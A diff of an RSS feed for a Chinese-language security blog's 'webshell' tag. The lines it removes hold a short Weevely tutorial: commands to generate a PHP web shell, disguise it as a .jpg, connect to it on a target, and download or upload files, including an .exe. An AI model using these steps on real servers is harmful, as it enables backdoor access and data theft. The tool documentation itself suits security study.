@@ -1,24 +1,15 @@
 <rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
     <channel>
-        <title>webshell - Tag - </title>
-        <link>https://amingosec.github.io/tags/webshell/</link>
-        <description>webshell - Tag - </description>
-        <generator>Hugo -- gohugo.io</generator><language>zh-TW</language><lastBuildDate>Mon, 07 Feb 2022 13:28:06 &#43;0000</lastBuildDate><atom:link href="https://amingosec.github.io/tags/webshell/" rel="self" type="application/rss+xml" /><item>
+        <title>webshell - 標籤 - 資安工作筆記</title>
+        <link>http://example.org/tags/webshell/</link>
+        <description>webshell - 標籤 - 資安工作筆記</description>
+        <generator>Hugo -- gohugo.io</generator><language>zh-TW</language><lastBuildDate>Mon, 07 Feb 2022 13:28:06 &#43;0000</lastBuildDate><atom:link href="http://example.org/tags/webshell/" rel="self" type="application/rss+xml" /><item>
     <title>工具介紹-Weevely (kali linux web shell產生工具)</title>
-    <link>https://amingosec.github.io/posts/introduction-to-weevely-php-webshell/</link>
+    <link>http://example.org/posts/introduction-to-weevely-php-webshell/</link>
     <pubDate>Mon, 07 Feb 2022 13:28:06 &#43;0000</pubDate>
-    <author>Author</author>
-    <guid>https://amingosec.github.io/posts/introduction-to-weevely-php-webshell/</guid>
-    <description><![CDATA[Weevely是使用python寫成的webshell管理工具，可產生php webshell。
-產生Webshell 使用以下指令產生webshell，要注意密碼用特殊字元有時會造成連線失敗。
-如果要產生圖片檔，以jpg命名結尾就可以了。
-weevely generate 567 hello.php 連線Webshell 上傳後使用以下指令連線後門，然後進入一個互動式的shell
-weevely http://urltowebshell/hello.php 567 如果是使用jpg的檔案，一樣直接連線該檔案就行。
-利用Webshell下載檔案 從遠端下載檔案，rpath是遠端路行 lpath是要存的本地路徑(都要包含檔名)
-file.download rpath lpath [-vector]
-利用Webshell上傳檔案 使用:file_upload2web指令可以檔案上傳到目標主機
-:file_upload2web lpath rpath
-:file\_upload2web /home/kali/Desktop/test.exe test.exe 延伸閱讀 資安監控-rever shell監控方法 工具介紹-Python-Backdoor 網頁攻擊手法-上傳弱點 參考資料 https://www.kali.org/tools/weevely https://securityonline.info/weevely-tutorial-php-webshell/ https://github.com/epinna/weevely3 ]]></description>
+    <author>作者</author>
+    <guid>http://example.org/posts/introduction-to-weevely-php-webshell/</guid>
+    <description><![CDATA[Weevely是使用python寫成的webshell管理工具，可產生php webshell。 產生Webshell 使用以下指令產生websh]]></description>
 </item>
 </channel>
 </rss>
